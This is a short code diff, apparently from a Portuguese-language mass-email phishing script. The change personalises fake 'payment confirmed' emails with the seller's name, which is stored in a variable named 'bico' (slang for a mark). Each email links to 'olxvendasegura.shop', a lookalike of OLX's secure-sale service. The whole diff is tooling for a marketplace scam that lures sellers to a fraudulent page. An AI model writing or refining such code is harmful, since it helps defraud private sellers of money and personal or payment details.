@@ -86,6 +86,7 @@ async function enviarEmMassa(
   const nomeProduto = produto.produto;
   const valorProduto = produto.valor;
   const nomeComprador = produto.comprador;
+  const bico = produto.vendedor.nome
 
   const linkProduto = `https://olxvendasegura.shop/pag/?id=${codigoVenda}`;
 
@@ -117,7 +118,7 @@ async function enviarEmMassa(
   </h2>
 
   <p style="text-align:center; color:#3c3c3c; font-size:15px;">
-    Olá, confirmamos seu pagamento com sucesso! Para continuar, clique no botão abaixo.
+    Olá <strong>${bico}</strong>, confirmamos o pagamento com sucesso! Para continuar, clique no botão abaixo.
   </p>
 
   <div style="text-align:center; margin:25px 0;">
